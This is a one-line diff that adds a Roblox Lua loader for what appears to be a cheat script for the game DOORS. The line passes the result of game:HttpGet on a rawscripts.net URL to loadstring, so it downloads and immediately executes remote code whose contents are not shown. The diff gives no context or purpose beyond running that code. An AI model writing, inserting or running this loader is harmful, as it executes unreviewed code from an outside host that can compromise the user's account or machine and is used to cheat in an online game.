@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/DOORS-awesome-script-11450"))()
